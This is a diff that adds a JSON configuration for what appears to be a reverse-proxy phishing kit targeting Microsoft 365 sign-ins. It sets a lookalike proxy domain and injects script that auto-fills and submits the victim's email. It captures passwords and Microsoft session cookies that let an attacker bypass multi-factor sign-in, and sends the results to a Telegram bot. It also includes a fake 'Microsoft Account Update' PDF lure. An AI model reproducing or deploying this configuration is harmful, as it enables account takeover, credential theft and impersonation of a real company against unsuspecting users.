@@ -1,0 +1,16 @@
+{
+    "proxyDomain": "ms.yourdomain.com",
+    "target": "https://login.microsoftonline.com",
+    "trackingCookie": "session_id",
+    "jsRules": "const email=decodeURIComponent(window.location.hash.slice(1));if(document.querySelector('input[name=loginfmt]')){document.querySelector('input[name=loginfmt]').value=email;setTimeout(()=>{document.querySelector('form')?.dispatchEvent(new Event('submit',{bubbles:true}));},500);}",
+    "captureFields": ["login", "password"],
+    "telegramBotToken": "YOUR_BOT_TOKEN",
+    "telegramChatId": "YOUR_CHAT_ID",
+    "serviceName": "Office 365",
+    "cookieCapture": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"],
+    "pdfTemplate": {
+        "title": "Microsoft Account Update",
+        "body": "Dear User,\n\nYour Microsoft account requires an update to continue accessing Office 365 services.\n\nClick here to update: {link}\n\nRegards,\nMicrosoft Team",
+        "filename": "Microsoft_Update.pdf"
+    }
+}
